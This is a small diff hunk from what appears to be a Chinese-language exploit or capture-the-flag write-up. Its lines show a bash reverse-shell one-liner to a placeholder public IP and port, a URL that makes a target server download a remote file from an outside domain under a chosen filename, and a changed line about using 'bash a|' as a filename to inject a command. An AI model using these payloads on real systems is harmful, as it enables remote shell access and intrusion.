@@ -34,7 +34,7 @@
 bash -i >& /dev/tcp/公网IP/公网端口 0>&1
 然后写入一个的文件
 http://117.50.3.97:8004/?url=http://ipv4.ssssdl.xyz/aa.txt&filename=a
-尝试执行
+写入bash a|文件，相当于例子中的touch id|
 ```
 
 
